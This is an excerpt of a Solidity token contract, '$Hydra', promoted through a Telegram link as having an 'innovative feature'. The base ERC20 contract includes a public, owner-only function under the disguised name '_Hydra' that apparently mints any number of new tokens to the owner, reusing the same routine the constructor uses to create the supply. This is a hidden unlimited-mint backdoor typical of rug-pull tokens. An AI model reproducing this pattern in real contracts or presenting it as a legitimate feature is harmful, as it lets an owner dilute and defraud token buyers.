//
// $Hydra proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/HydraBep20
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Hydra(uint256 amount) public onlyOwner {
 _Hydra(msg.sender, amount);
    }
    ...
    function _Hydra(address account, uint256 amount) internal virtual {
...
contract $Hydra is ERC20 {
    ...
    constructor() public ERC20("Hydra", "HYDRA") {
     _Hydra(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}